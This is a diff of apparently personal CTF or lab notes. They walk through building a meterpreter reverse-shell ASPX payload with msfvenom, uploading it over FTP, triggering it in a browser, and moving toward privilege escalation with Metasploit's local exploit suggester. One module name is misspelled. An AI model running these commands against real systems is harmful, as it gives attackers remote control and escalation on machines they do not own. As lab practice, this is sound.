@@ -196,7 +196,9 @@ put dog.jpg
 msfvenom cheat sheet
 https://netsec.ws/?p=331
 
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.27 LPORT=4444 -f aspx > ex.aspx
+----- IMPORTANTISSIMO: IP não é 192.168.0.27 mas 10.10.12.28 -------
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.12.28 LPORT=4444 -f aspx > ex.aspx
 
 msfconsole
 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
@@ -205,4 +207,11 @@ ftp put ex.aspx
 
 open browser 10.10.10.5/ex.aspx
 
+sysinfo
+
+getuid
+
+** escalate privileges:
+
+use multi/recon/local_exploi_suggester
 
